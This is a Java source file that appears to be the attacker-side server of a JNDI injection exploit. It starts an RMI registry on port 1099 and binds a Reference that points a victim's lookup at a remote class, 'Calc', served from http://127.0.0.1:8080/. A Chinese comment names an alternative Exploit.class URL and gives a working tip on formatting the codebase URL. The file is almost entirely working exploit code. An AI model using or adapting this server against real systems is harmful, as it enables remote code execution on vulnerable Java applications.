package com.venscor.jdni;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Calc.class
        Reference reference = new Reference("Calc",
                "Calc", "http://127.0.0.1:8080/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("RemoteBean", referenceWrapper);

    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
